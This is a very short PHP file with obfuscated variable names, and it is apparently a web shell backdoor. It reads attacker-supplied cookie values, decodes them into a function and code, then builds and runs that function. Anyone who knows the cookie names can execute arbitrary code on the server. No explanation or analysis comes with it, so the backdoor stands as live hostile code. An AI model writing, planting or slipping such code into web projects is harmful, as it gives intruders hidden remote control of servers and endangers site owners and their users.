<?php

$ggj=$_COOKIE;
$sql=$ggj[wrdh];
if($sql){
	$qpdpm=$sql($ggj[yntx]);$dta=$sql($ggj[gyhb]);$bkonw=$qpdpm("",$dta);$bkonw();
}